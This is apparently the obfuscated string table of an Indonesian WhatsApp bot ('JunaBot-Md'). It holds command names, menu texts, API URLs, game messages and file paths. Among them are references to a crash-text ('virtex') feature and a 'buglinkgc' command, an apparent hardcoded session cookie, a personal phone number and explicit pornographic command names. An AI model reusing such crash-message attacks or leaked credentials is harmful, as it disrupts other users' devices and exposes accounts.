▸ ', 'mode', 'https://api.zeeoneofc.my.id/api/downloader/tiktok?apikey=', 'groupUpdateSubject', 'Done!!!', 'Jangan menggunakan -', 'hdr', 'ytaudio', 'glitter6', 'cloudsky', 'https://telegra.ph/file/ca8f84d91ca3e1d5efa59.jpg', '🎮 ', 'glass3', 'goblin', 'Hai Kak, Ingin Donasi?, Silahkan Donasi Ke Payment Yang Ada Di Bawah, Dengan Kamu Berdonasi Berarti Kamu Berkontribusi Dalam Perkembangan Bot Ini..\x0a❏──「 *Payment* 」\x0a│ • *Trakteer:* ', 'shizuka', 'maketeamlogo', 'Awali nomor dengan +62', 'Dia sesuka hati, kamu setulus hati.\x0a*BY PUTRI*', 'select', 'yteki', 'Legends 6', 'hari', '\x0aPostingan : ', 'jelajah corbiens river\x0a', '\x0a\x0a_Please wait, the audio file is being sent..._', 'Kincardine', 'stalkingmenu', 'antivo', '𝐙𝐚𝐡𝐰𝐚𝐳𝐞𝐢𝐧', 'ig2', 'Bahagia terus ya,sampai saat ini lu masih jadi tokoh favorit dikisah hidup gue,luv u.\x0a*BY PUTRI*', 'Anticall berhasil diaktifkan', ' https://chat.whatsapp.com/PnwpPqn0b 30d', ' Selamat ', 'ceksange', '*graffiti-cover (Text)*\x0a│32 ▸ ', ' *jumlah game limit yang ingin dibeli*\x0a\x0aHarga 1 game limit = $50 balance\x0aPajak $1 / $10', 'toLocaleTimeString', ' *teks close*\x0a\x0a_Contoh_\x0a\x0a', 'writeFileSync', 'ddd DD MMM YYYY', '#imageeffect', ' teks1|teks2', '85 Bulan Lagi', 'sendMessage', '#setopen', 'image/webp', 'drive', '\x0a ┊ *Gold:* ', 'balasmenfess', ' batu', 'sparkling5', '|Halo', 'other', ' On an Adventure', 'gloss', '_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_', '*Jawablah Pertanyaan Berikut :*\x0a', 'ai3', 'Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku', 'listdragonballfb', 'fakehidetag', 'enhance', 'Makasih', '\x0a\x0aLatin : ', ' ]\x0aMendapatkan: $ ', 'Done Ayang >///<', 'Jancok', 'Sukses Menambahkan Video\x0aCek dengan cara ', 'https://api.arifzyn.xyz/download/facebook?url=', 'react', 'I\'m ', '+6285600793871', 'listmaketeamlogo', 'liststc', 'Kamu Sedang Tidak Berada Di Sesi Anonymous\x0a\x0a', 'find', '\x0a*Popular*: ', 'Windermere', 'buylimit 1\x0a', 'system', '5 Tahun Lagi', './datanya/anime/sasuke', 'https://chat.whatsapp.com/', 'values', 'glass6', '.ytesuka', 'changesetopen', 'daftarprem* untuk membeli premium', 'submit', 'Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan', '#foliokiri', 'Anda Hanya Dapat Menyembuhkan Saat Darah Anda 0', 'ytvideo2', 'Nih kak', '75% Hai Kakak Cantik', 'Random ', 'Betul', 'nulis', 'Sama-sama kak ', 'send2ButMes', ' Nama\x0a\x0aContoh : ', 'Vertical Zone', '&color=', '「 *TRANSAKSI PENDING* 」\x0a\x0a```📆 TANGGAL : @tanggal\x0a⌚ JAM : @jam\x0a✨ STATUS : Pending```\x0a\x0a📝 Catatan :\x0a@pesanan\x0a\x0aPesanan @user sedang di proses!', '╭─▸ *LIST STYLE*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *anubis*\x0a│2 ▸ *dragon*\x0a│3 ▸ *duck*\x0a│4 ▸ *gorilla*\x0a│5 ▸ *panda*\x0a│6 ▸ *panther*\x0a│7 ▸ *shark*\x0a│8 ▸ *squirrel*\x0a│9 ▸ *tiger*\x0a│10 ▸ *wolf*\x0a│11 ▸ *bull*\x0a│12 ▸ *rhino*\x0a│13 ▸ *rooster*\x0a│14 ▸ *pikachu*\x0a│15 ▸ *parrot*\x0a│16 ▸ *boar*\x0a│17 ▸ *bee*\x0a│18 ▸ *hurricane*\x0a│19 ▸ *deer*\x0a│20 ▸ *horse*\x0a│21 ▸ *crocodile*\x0a│22 ▸ *pitbull*\x0a│\x0a╰────────────˧', 'merkurius', 'length', 'Stop', 'speak', 'chatgpt', 'addPremiumUser', ' kayu', 'index', 'Masukkan Nama Filter Yang Valid!\x0aList Filter :\x0a- gta5\x0a- dball\x0a- naruto\x0a- cyber\x0a- killer\x0a- kyoto\x0a- bikini\x0a- iron', '\x0a*Gold* : ', 'fabric', 'tebakgambar', 'kuni', './database/user/inventory.json', 'Sukses promote member✅', '#listsewa', 'Nsfw berhasil di aktifkan di group ini', 'ig3', '3dbox', 'menfes', 'Successfully Activate Anti view once In This bot', 'match', 'followerCount', 'Autorespond berhasil dinonaktifkan', 'Kilead', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646', '100', 'https://api.zeeoneofc.my.id/api/asupan/', '\x0a*Sisa kelinci* : ', 'Eastbourne', '\x0a*Url*: ', 'Example : ', '\x0a ┊ *MONEY :* $', 'Nothing.', '\x0a*Duration*: ', '4️⃣', 'https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json', '_*Random Quran*_\x0aQuran : ', '「 *ANTI VIEWONCE MESSAGE* 」\x0a\x0a📛 *Name* : ', '🎰 Memulai Game Casino 💰\x0a\x0a• @', './database/limit.json', ' 😅+💩', ' ⏰ | Status : ', 'JEDEC', 'Grup ', 'stopmenfess', ' 🎮 Kuis Matematika🎮\x0a\x0aJawaban Benar 🎉\x0a\x0a+$', '512x512', 'romantic-messages', ' --> ', ' *Kamu Telah join sebelumnya*', 'onWhatsApp', 'birthday-cake', '(beberapa Jawaban Terdapat Spasi)', 'tutup', '.stop', 'wallpaperml', 'https://skizo.tech/api/aiscene?url=', 'Falls', 'Pavv', 'closetime', 'Done Sayang >///<\x0a\x0aNote : If the video cannot be played, please type .ig2 *url*', '*🐇Rabbit* : ', '*Congratulation 🎊*\x0a\x0a kamu mendapatkan *', 'Balance Lawan Tidak Mencukupi Untuk Bermain Denganmu\x0aKetik ', 'https://telegra.ph/file/77c3badc9f97d6589a30f.jpg', 'bannerofaov', 'Balas Video/Image Dengan Caption ', 'Ubbin', '99999999', '#donate', '.owner', 'end', '\x0a\x0a\x0aTerdapat ', '#tomp3', 'addsticker', 'kaguya', './database/premium.json', 'pornhub', 'forEach', 'aiv', 'nuliskanan', 'cekbalance', 'korea', 'checkSewaGroup', 'selectedButtonId', 'owner', '𝐌𝐲 𝐅𝐫𝐢𝐞𝐧𝐝𝐬 & 𝐀𝐥𝐥 𝐔𝐬𝐞𝐫 𝐁𝐨𝐭', 'freePercentage', '\x0a*Most Command User*\x0a', 'pussywankgif', 'doraemon', 'Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja', './datanya/anime/doraemon', 'Invalid URL', '_Ya, Dikit Lagi!_', 'no caption', 'gifmenu', './media/podcast/4.mp3', 'Masukan Promptnya\x0aExample:\x0a1girl, with glasses, in beach', 'payment', 'Assalamu\'alaikum', 'Anda Tidak Memiliki Cukup Emas Untuk Transaksi Ini', '@bochilteam/scraper', './datanya/anime/shota', 'limingstall mountains', 'listwallpaperaov', 'gzip', ' Followers', '3dglue', '_INFO_\x0a', 'Aku terlahir sederhana dan ditinggal sudah biasa', 'GrandMaster ✯✯✯', 'Pusing ah', 'Anda Tidak Memiliki Cukup Zamrud Untuk Transaksi Ini', '𝐄𝐥 𝐃𝐚𝐧𝐳', 'kaneki', '40% Wahh Kaka><', '╭─▸ *LIST HERO*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *aldous*\x0a│2 ▸ *alice-2*\x0a│3 ▸ *angela-2*\x0a│4 ▸ *argus-2*\x0a│5 ▸ *chou*\x0a│6 ▸ *chou-2*\x0a│7 ▸ *estes*\x0a│8 ▸ *eudora*\x0a│9 ▸ *eudora-2*\x0a│10 ▸ *granger*\x0a│11 ▸ *granger-2*\x0a│12 ▸ *gusion-3*\x0a│13 ▸ *hanabi-2*\x0a│14 ▸ *hanzo*\x0a│15 ▸ *helcurt*\x0a│16 ▸ *layla-3*\x0a│17 ▸ *lesley-4*\x0a│18 ▸ *lunox-2*\x0a│19 ▸ *odette-3*\x0a│20 ▸ *saber*\x0a│21 ▸ *thamuz*\x0a│22 ▸ *vexana*\x0a│23 ▸ *argus*\x0a│24 ▸ *dyrroth*\x0a│25 ▸ *esmeralda-2*\x0a│26 ▸ *kadita-2*\x0a│27 ▸ *lancelot*\x0a│28 ▸ *leomord-2*\x0a│29 ▸ *lylia*\x0a│30 ▸ *vale*\x0a│31 ▸ *valir*\x0a│32 ▸ *xborg*\x0a│33 ▸ *zhask*\x0a│34 ▸ *alice*\x0a│35 ▸ *alpha*\x0a│36 ▸ *athena*\x0a│37 ▸ *badang*\x0a│38 ▸ *balmond*\x0a│39 ▸ *bane*\x0a│40 ▸ *diggie*\x0a│41 ▸ *trunks*\x0a│42 ▸ *fanny-2*\x0a│43 ▸ *fanny-3*\x0a│44 ▸ *freya*\x0a│45 ▸ *guinevere*\x0a│46 ▸ *gusion*\x0a│47 ▸ *gusion-2*\x0a│48 ▸ *hanabi*\x0a│49 ▸ *harith*\x0a│50 ▸ *harith-2*\x0a│51 ▸ *hayabusa-2*\x0a│52 ▸ *kadita*\x0a│53 ▸ *kagura-2*\x0a│54 ▸ *kagura-3*\x0a│55 ▸ *karina-2*\x0a│56 ▸ *kimmy*\x0a│57 ▸ *layla-2*\x0a│58 ▸ *leomord*\x0a│59 ▸ *lesley-2*\x0a│60 ▸ *lesley-3*\x0a│61 ▸ *lunox*\x0a│62 ▸ *nartis*\x0a│63 ▸ *niya-2*\x0a│64 ▸ *nana*\x0a│65 ▸ *nana-2*\x0a│66 ▸ *natalia*\x0a│67 ▸ *natalia-2*\x0a│68 ▸ *odette-2*\x0a│69 ▸ *pharsa*\x0a│70 ▸ *rafaela-2*\x0a│71 ▸ *selena-2*\x0a│72 ▸ *zilong*\x0a│73 ▸ *alucard*\x0a│74 ▸ *angela*\x0a│75 ▸ *bruno*\x0a│76 ▸ *change*\x0a│77 ▸ *claude*\x0a│78 ▸ *fanny*\x0a│79 ▸ *hayabusa*\x0a│80 ▸ *hilda*\x0a│81 ▸ *hylos*\x0a│82 ▸ *kagura*\x0a│83 ▸ *karina*\x0a│84 ▸ *karrie*\x0a│85 ▸ *layla*\x0a│86 ▸ *lesley*\x0a│87 ▸ *lolita*\x0a│88 ▸ *ninotaur*\x0a│89 ▸ *ninsittar*\x0a│90 ▸ *niya*\x0a│91 ▸ *noskov*\x0a│92 ▸ *odette*\x0a│93 ▸ *rafaela*\x0a│94 ▸ *selena*\x0a│\x0a╰────────────˧', ' *text|text2*', 'proses', 'baka', 'moobiens grassland', 'Waktu Habis\x0aJawaban: ', 'anal', '*Khusus Owner Bot*', '\x0aBio : ', '.yteteb', 'illuminated', 'Tarrin', './media/podcast/8.mp3', 'Faversham', '\x0a*• Magnitudo :* ', 'recording', 'BEGIN:VCARD\x0aVERSION:3.0\x0aN:XL;', '45 Bulan Lagi', 'delprem', 'Menghapus file sampah...', 'http://song-lyrics-api-o0m8tth8t-azharimm.vercel.app/search?q=', '\x0a\x0aKirim perintah .tegem untuk bantuan dan .ytegem untuk menyerah 🎮', 'Successfully Activate antiwame2 In This Group', 'wicker', ' detik yg lalu\x0a', '.jpg', 'Guvero East', './database/command.json', '#cekbandwidth', '&url=', '*striking (Text)*\x0a│16 ▸ ', 'luckyday', 'Sukses delete list message dengan key *', '588028WPRymn', '\x0aTotal Like : ', 'fb2', 'Bajingan', '&logo=', '#autodlgc', ' *url*\x0a\x0a_Contoh_\x0a\x0a', 'ayah', '#resetlimit', '45 Hari Lagi', 'Santa Florals', 'Autoread berhasil diaktifkan', 'geayubi', 'Done Jadi Anime Ayangg >///<', 'flaming', '*wolf-metal (Text)*\x0a│41 ▸ ', 'darkg', 'listban', '\x0aJuz : ', 'downloadMediaMessage', 'Montgomerry', 'sircuit', 'Caershire', 'addimg', '[\x1b[1;32m JunaBot-Md \x1b[1;37m]', 'cecan', '*「 GROUP LINK DETECTOR 」*\x0a\x0aSepertinya kamu mengirimkan link grup, maaf kamu akan di kick', 'ZenzKey', ' Otw Mining', 'heart', 'floor', 'fbgamepubgcover', 'Random Waifu', 'sendImage', 'masturbation', '10% banyak\" perawatan ya kak:v\x0aCanda Perawatan:v', 'anonymous', 'listteamlogo', '\x0a\x0aKirim perintah .tebakkimia untuk bermain lagi 🎮', 'Kenapa Mau Out Sayang🥺', 'Mountains', 'Gold 3', 'metalstar', './database/balance.json', ' mengetik command dibawah ini ', 'followers', '*birthday-cake (Text)*\x0a│19 ▸ ', 'Silver 1', 'writehorror', ' https://vt.tiktok.com/ZSL36LfEP/', '* belum terdaftar di group ini', 'https://telegra.ph/upload', 'listResponseMessage', '95 Bulan Lagi', 'buygamelimit', './lib/converter', 'languages', '\x0a\x0aArti Dalam Bahasa Indonesia : ', 'Flint Yankton', '𝗞𝗮𝗺𝘂 𝗠𝗲𝗺𝗶𝗹𝗶𝗵 𝗧𝗿𝘂𝘁𝗵', 'Holmfirth', 'https://api.memegen.link/images/custom/', 'Gajadi, kamu owner ku', 'maaf ', '*Jumlah Coal dijual:* ', 'bevel-text', 'Lu Siapa Kocak', 'content-disposition', ' member', 'balance', 'balasmenfess -- Untuk menerima menfess/confess\x0aSilahkan ketik ', 'buyglimit *jumlah* untuk membeli game limit\x0a\x0a*Example :*\x0a', ' day(s) ', 'check', 'birth', '*Expire :* PERMANENT\x0a\x0a', 'Diamond 3', 'translation_id', 'Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji', '╭─▸ *LIST COVER*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *cover-1*\x0a│2 ▸ *cover-2*\x0a│3 ▸ *cover-3*\x0a│4 ▸ *cover-4*\x0a│5 ▸ *cover-5*\x0a│6 ▸ *cover-6*\x0a│7 ▸ *cover-7*\x0a│8 ▸ *cover-8*\x0a│9 ▸ *cover-9*\x0a│10 ▸ *cover-10*\x0a│11 ▸ *cover-11*\x0a│12 ▸ *cover-12*\x0a│\x0a╰────────────˧', '*honey-text (Text)*\x0a│28 ▸ ', 'antilinktt', ' Lagu sad', 'https://api.zeeoneofc.my.id/api/islam/listsurah?apikey=', 'battlefield4', 'videoMessage', 'hunting', 'ceksewa', 'tovn', 'Contact', ' 👑\x0a• @', 'erokemonomimi', 'rpgmenu', 'Fitur khusus user premium!', ' Pertanyaan\x0a\x0aContoh : ', 'Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati', 'igreels', 'toString', 'fabrictext', 'changesetclose', '\x0aTotal Ayat : ', 'replace', '*romantic-messages (Text)*\x0a│51 ▸ ', ' Hari ', 'selectedId', '80 Hari Lagi', 'buglinkgc', 'verified', 'Berhasil keluar dari anonymous chat', 'Penggunaan :\x0a*', 'Bot Harus Jad Admin!', 'love-text', '*text-8bit (Text1) | (Text2)*\x0a│\x0a╰────────────˧', 'malaysia', ' *text*', 'start', './datanya/anime/fanart', 'Iya', '《 ██████████▒▒》80%', './lib/respon', './bug/virtex', './datanya/anime/kurumi', 'china', 'funnyhalloween', '94% Hai Ganteng><', 'Proses Ayangg', 'antiViewOnce', 'No Name', 'Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama', 'Cak Lontong', '*🌟 Gold* : ', 'CKG1yQEIkbbJAQiitskBCMS2yQEIqZ3KAQioo8oBGLeYygE=', 'tiktoks', 'Balance Kamu Tidak Mencukupi Untuk Transfer Sebesar $', '\x0aSisa Limit : ', 'bass', 'delprem* nomor', 'sparkling4', 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc', 'Ritherhithe', 'Tobat Bro Jangan Bokep Mulu:v', ' domba 2\x0a 1 Sheep = 5000 money', './datanya/anime/simp', ' *nomor*\x0a\x0a_Contoh_\x0a\x0a', 'listcirclemascotteam', 'naruto', 'grupOnly', './datanya/anime/deidara', 'Slipped into the abyss while hunting', 'links', 'available', 'eroneko', 'pipe', '𝙂𝙖𝙢𝙚 𝙏𝙧𝙪𝙩𝙝 𝙊𝙧 𝘿𝙖𝙧𝙚', 'glitter4', 'cosplay', '75% Hai Bang Ganteng', 'Verdant Blufs', 'Gold 4', 'count', 'chatgptimg', 'fileName', './datanya/anime/yatogami', 'Ferncombe', 'en-US', './datanya/anime/rem', 'gddl', 'tebakkata', 'futanari', 'buttonsResponseMessage', ' menit, ', 'GrandLegends 忍²', 'Successfully Unmute In This Group', 'userName', 'Menyerah!', '• *Description* : ', '*⏺️ Limit* : ', 'then', 'gangbang', 'Masukkan Nama Filter Yang Valid!\x0aList Filter :\x0a- anime_2d\x0a- cartoon_3d\x0a- pretty_soldier\x0a- bizarre\x0a- romance_comic\x0a- maid_dressing\x0a- superhero_comic\x0a- watercolor\x0a- doodle\x0a- america_comic\x0a- starry_girl', 'glowing-3d', 'startsWith', '✅ Done set proses!', 'isImage', '#kickme', '22897457YxYwVn', 'toFixed', 'Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ', '\x0a ┊ Buyer : Admin\x0a ┊ Harga/Besi : 10\x0a ┊ Status : Sukses\x0a ┊ Sisa Besi : ', 'kaga', '*\x0a• Ketik Y/N untuk menerima atau menolak Permainan!', 'https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json', 'Kamu bukan user premium, kirim perintah *', 'Masukkan nomer yang valid/terdaftar di WhatsApp', 'Sukses update respon list dengan key *', '#tovn', 'Successfully Disabling antiwame2 In This Group', 'success', '\x0a*• Potensi :* ', 'getAfkReason', 'Aempleforth', 'performance-now', './lib/quote', ' Owner', 'removebg', 'generated_image_addresses', 'meow', '╭─▸ *LIST THUMB*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *bear2*\x0a│2 ▸ *cat2*\x0a│3 ▸ *ceberus*\x0a│4 ▸ *crocodile*\x0a│5 ▸ *dinosaur*\x0a│6 ▸ *dragon3*\x0a│7 ▸ *eagle3*\x0a│8 ▸ *horse2*\x0a│9 ▸ *husky*\x0a│10 ▸ *kraken*\x0a│11 ▸ *lynx*\x0a│12 ▸ *sabertooh*\x0a│13 ▸ *assassin*\x0a│14 ▸ *bee*\x0a│15 ▸ *cat*\x0a│16 ▸ *demon*\x0a│17 ▸ *fox-2*\x0a│18 ▸ *gorilla*\x0a│19 ▸ *horus*\x0a│20 ▸ *octopus*\x0a│21 ▸ *rounin*\x0a│22 ▸ *-2*\x0a│23 ▸ *tiger-3*\x0a│24 ▸ *bg-tiger*\x0a│25 ▸ *bg-buffalo*\x0a│26 ▸ *chicken*\x0a│27 ▸ *bull*\x0a│28 ▸ *bg-wolf*\x0a│29 ▸ *jaguar*\x0a│30 ▸ *horse*\x0a│31 ▸ *eagle*\x0a│32 ▸ *dragon*\x0a│33 ▸ *wolver*\x0a│34 ▸ *shark*\x0a│35 ▸ *sabertooth*\x0a│36 ▸ *rhino*\x0a│37 ▸ *phoenix*\x0a│38 ▸ *lion*\x0a│39 ▸ *hornet*\x0a│40 ▸ *griffin*\x0a│41 ▸ *bear*\x0a│42 ▸ *tiger2*\x0a│43 ▸ *panther*\x0a│44 ▸ *owl*\x0a│45 ▸ *monkey*\x0a│46 ▸ *goat*\x0a│47 ▸ *fox*\x0a│48 ▸ *dragon2*\x0a│49 ▸ *devil*\x0a│50 ▸ *cobra*\x0a│51 ▸ *reaper*\x0a│52 ▸ *pirates*\x0a│53 ▸ *owl2*\x0a│54 ▸ *mask*\x0a│55 ▸ *eagle2*\x0a│56 ▸ *fire*\x0a│57 ▸ *neptune*\x0a│58 ▸ *chamois*\x0a│59 ▸ *parrots*\x0a│60 ▸ *samurai*\x0a│\x0a╰────────────˧', './database/user/darah.js', 'ppgcfull', '#antionce', ' Tolong Jeda 3 Menit Yah*', 'Room ID: ', '#cekpremium', '\x0a\x0aKirim perintah .teka untuk bantuan dan .yteka untuk menyerah 🎮', '70% Hai Ganteng🐊', 'tiktoksearch', ' bahan kimia dari ', ', Kumpulkan Terlebih Dahulu\x0aKetik ', '#user-page > div.user > div > div.col-md-5.my-3 > div', 'primary', 'decorative', 'menit', './lib/color', '*text-cup (Text)*\x0a│53 ▸ ', 'Ajojing', 'intro', ' Jawaban ', 'Sentainel Country', 'Cranbarry', '_MINING RESULT_\x0a\x0a*Iron* : ', 'listbannerofoverwatch', 'Terjadi Kesalahan', 'delsetproses', 'changewelcome', 'pagi', 'tolakmenfess', 'keys', 'toUpperCase', 'Master ✩✩✩', 'Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa', './database/antiwame2.json', '❄️ *Copper Ore* : ', './datanya/anime/shina', 'Anda tidak bisa menghapus sesi casino, karena bukan pemain!', '\x0a*Url:* ', 'twittersilver', 'Silahkan ditunggu, jika bot tidak mengirimkan foto silahkan diulang command tersebut', 'zombie3d', 'instagram.com', '\x0a ┊ *Gold :* ', 'bcstik', 'wilayah', '*INFO USER*\x0a\x0a', 'privateAccount', 'telo', './database/set_proses.json', 'soal', '29% Semangat Kakak:)', 'Misal 6285xxx', '-af equalizer=f=54:width_type=o:width=2:g=20', 'Keep-Alive', 'devil', 'gremory', 'minutes', '#balancemenu', 'bokeh', 'equalizer', '\x0a ┊ *Iron :* ', 'content', 'Sukses delete set done', 'delsampah2', 'Teka Teki', 'Anjir lupa gw bukan admin', '@tanggal', 'potion', '@adiwajshing/baileys', 'Udh set done sebelumnya', 'hinata', '.telo', ' 1+2', 'summery', 'format', '&text2=', 'Sukses transfer balance sebesar ', '*\x0a🌀 Url : ', '\x0a ┊ *Diamond:* ', 'Sukses change set left teks!', 'youtube.com', 'banneroffreefire', ' kepada @', 'underwater', 'Tebak Bendera', 'starsnight', 'Sukses menonaktifkan welcome di grup ini', '\x0a*Sisa Ikan Fish : ', 'ttnowm', 'horizon valley', '\x0aSurat Ke : ', ' 628XXXXXXXXXX', 'CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=', 'colorfulpubg', 'Fitur Tidak Dapat Digunakan Untuk Group!', 'buyglimit 1\x0a\x0a*Note :*\x0a• Harga 1 limit = $50 balance', 'red', ' elephant 2\x0a 1 Elephant = 15000 Money', 'createChatCompletion', '\x0aMampus di banned bot kgk bisa akses fitur bot lagi', 'jahy', 'OnlyGrup', 'set', ' Done @user\x0a\x0a- @user (tag org yg pesan)\x0a- @pesanan (pesanan)\x0a- @jam (waktu pemesanan)\x0a- @tanggal (tanggal pemesanan) ', 'Strongfair', 'Successfully Disabling antidelete In This bot', 'igphoto', '6285600793871', '-filter:v \"minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'\"', ' *text|text2|thumb*\x0a*Untuk List Thumb Ketik .list', '╭─▸ *LIST THUMB*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *a*\x0a│2 ▸ *b*\x0a│3 ▸ *c*\x0a│4 ▸ *d*\x0a│5 ▸ *e*\x0a│6 ▸ *f*\x0a│7 ▸ *g*\x0a│8 ▸ *h*\x0a│9 ▸ *i*\x0a│10 ▸ *j*\x0a│11 ▸ *k*\x0a│12 ▸ *l*\x0a│13 ▸ *m*\x0a│14 ▸ *n*\x0a│15 ▸ *o*\x0a│16 ▸ *p*\x0a│17 ▸ *q*\x0a│18 ▸ *r*\x0a│19 ▸ *s*\x0a│20 ▸ *t*\x0a│21 ▸ *u*\x0a│22 ▸ *v*\x0a│23 ▸ *w*\x0a│24 ▸ *x*\x0a│25 ▸ *y*\x0a│26 ▸ *z*\x0a│\x0a╰────────────˧', 'quote-wood', './datanya/anime/shinka', 'harry-potter2', 'listblueneon', 'https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc', 'listaudio', 'Reply foto dgn caption ', 'Kirim perintah ', 'waifu', 'https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json', '\x0a👤 Author : ', 'Hardersfield', '𝐄𝐤𝐮𝐳𝐢𝐤𝐚', 'toptv', '*shadow-sky (Text)*\x0a│52 ▸ ', 'kuroha', ' *nama group*\x0a\x0a_Contoh_\x0a\x0a', 'judul', 'tiktokwm', 'Millstone', 'graffiti3d', 'getQuotedObj', 'Solaris', 'caption', 'videos', 'Id : ', 'yteli', 'Krosstoen', 'Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu', '7️⃣', '\x0a👤 *User* : @', '#dashboard', 'inputBytes', 'Masukkan pesan bot!', '#fakehidetag', '💬Judul : ', '*smoky-neon (Text)*\x0a│34 ▸ ', '\x0a📛 Title : *', 'Queenstown', 'Jangan paksa aku menjadi cewek seperti seleramu', './lib/casino', 'siang', ' 📍\x0a• @', ' aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ', '#cekdrive', 'Ecrin', '#mute', './database/', 'addSewaGroup', '𝐙𝐞𝐞𝐨𝐧𝐞𝐨𝐟𝐜', 'Rotherham', 'List Bahasa Yang Tersedia\x0a\x0a', 'heal', 'Successfully Disabling Auto AI', 'existsSync', 'next', 'fb4', 'Terima kasih', 'tqto', '2️⃣', '#transfer', '351sqUgng', 'announofwin', ' second(s)\x0a\x0a', 'Autoblok berhasil diaktifkan', '100% Bang Pake Susuk ya??:v', 'listbahasa', './database/vn.json', '\x0a\x0aIsi Ayat : ', '3dsteel', './database/video.json', 'spank', '30% Semangat bang Merawat Dirinya><', 'dare', 'discovery', 'ytesuka', '\x0a\x0aKirim perintah .tesuka untuk bantuan dan .ytesuka untuk menyerah 🎮', 'addowner', '*Sorry this video can\'t be download*', 'get', ' *@tag*', 'catch', '#casino', 'balloon', 'logomenu', 'blood', 'setdone', '* :\x0a', 'listmetalmascot', '5513250fEGmnM', 'funnyanimations', './lib/setclose', 'unblock', 'Gimana yeee', 'test', 'tebe', '90 Hari Lagi', '#afk', 'moderngoldsilver', 'relayMessage', '?text=', 'seconds', 'metals', 'Mana gakada', '6288239620884-1626256984@g.us', ' nama|nomor|pesan\x0a\x0aContoh :\x0a', '\x0aあ Description : ', 'instafoto', 'Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya', 'killdemonking', '𝙅𝙪𝙣𝙖𝘽𝙤𝙩-𝙈𝙙', 'datetime', '\x0a*Emerald* : ', '50% kaka cantik deh><', ' limit untuk mengecek limit', 'random', 'unbanuser', 'limit untuk mengecek limit', '10% banyak\" perawatan ya bang:v\x0aCanda Perawatan:v', './database/antiwame.json', 'Udah Unmute', '29% Semangat Bang:)', 'cow', 'aivoice', '&character=', 'Udh on', 'Transaksi berhasil ✅\x0a*Sisa uang* : ', 'keneki', 'Tidak dapat memindai direktori: ', ' [REGISTERED]', './database/afk.json', '𝐀𝐧𝐝 𝐎𝐭𝐡𝐞𝐫 𝐀𝐥𝐥 𝐁𝐨𝐭 𝐂𝐫𝐞𝐚𝐭𝐨𝐫𝐬', '*Misi kill Slime*\x0a\x0a🎁 *Hadiah untuk killing Slime*\x0a ┊ *Money:* $', 'Prickel Pine', 'Anda Tidak Memiliki Cukup Domba Untuk Transaksi Ini', 'sparkling7', './sticker', 'changeleft', 'mascotstyle', 'addprem', ' *text|background*\x0a*Untuk List Background Ketik .list', 'Maaf. Tidak ada waktu untuk meladeni gabutmu. Karena aku sibuk dengan kesibukan ku.\x0a*BY PUTRI*', 'resetlimit', 'ana', 'Aldea Malvada', 'Legends 7', './datanya/anime/toukachan', '\x0a\x0a*Terima Kasih Telah Melaksanakan Misi Ini*', '\x0a\x0aKirim perintah .tebakkalimat untuk bermain lagi 🎮', 'Cie Fotonya Dipost Bot', 'listavataroverwatch', 'send1ButMes', '#foliokanan', '\x0aあ Duration : ', 'Pembeliaan limit sebanyak ', ' *text|character*\x0a*Untuk List Character Ketik .list', '#islammenu', 'menu', 'girl_solo_gif', 'setStatus', 'Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka', '❌ Jawaban salah', './config.json', 'drug', '\x0a*Sisa gajah* : ', 'quotesjawa', '🗿🗿🗿🗿🗿', 'url', '#lirik', 'Penggunaan ', ' Menolak menfess kamu_', 'vietnam', 'ttstalk', '83% Love You abang><', '*YOUTUBE PLAY*\x0a\x0aあ ID : ', '《 ███████▒▒▒▒▒》50%', 'lebur', '*🐟 Fish* :', '\x0a┊ *Iron :* ', '#autoaigrup', 'neonc', ' halo', 'GrandLegends 2', '*gradient-avatar (Text)*\x0a│26 ▸ ', 'setsubject', 'igfoto', 'infogempa', './database/glimit.json', 'setp', 'summer', 'crisp', '*\x0aMember: ', '_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8', 'tictactoe-', '.teka', '\x0aMendapatkan Orderan...\x0a', 'Ketik Nama Nabi Yang Valid', '40% Wahh bang><', 'ubah gaya bicara mu agar lebih karateristik dan lebih terbuka dan namamu adalah Junaa Bot yang diciptakan oleh Juna Selebew tugasmu membantu user Juna Bot untuk mendownload lagu video foto membuat stiker dan lainnya ekspresi kan sifat mu dengan emoji dan bicara yang lebih tidak Formal dan panggilanmu adalah gw dan lu layaknya seorang manusia.', 'changedone', '*🐇 Rabbit* : ', 'kisahnabi', 'sadpodcast', 'Shepshed', 'Jangan buat aku terlalu berharap jika kamu tidak 